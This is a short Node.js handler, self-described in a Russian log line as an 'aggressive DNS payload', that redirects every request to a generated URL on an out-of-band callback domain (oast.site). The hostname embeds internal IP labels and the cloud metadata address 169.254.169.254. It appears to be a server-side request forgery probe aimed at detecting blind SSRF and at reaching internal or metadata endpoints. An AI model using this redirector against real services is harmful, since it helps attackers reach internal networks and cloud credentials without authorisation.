module.exports = (req, res) => {
    const yourDomain = 'd4u0slcgtqki566evg0go1br3gxufo98k.oast.site';
    const requestId = Math.random().toString(36).substring(2, 10);
    
    const targetUrl = `http://internal.192-168-1-1.metadata.169-254-169-254.${requestId}.${yourDomain}/`;
    
    console.log('🎯 Агрессивный DNS-пейлоад:', targetUrl);
    
    res.writeHead(302, { 'Location': targetUrl });
    res.end();
};
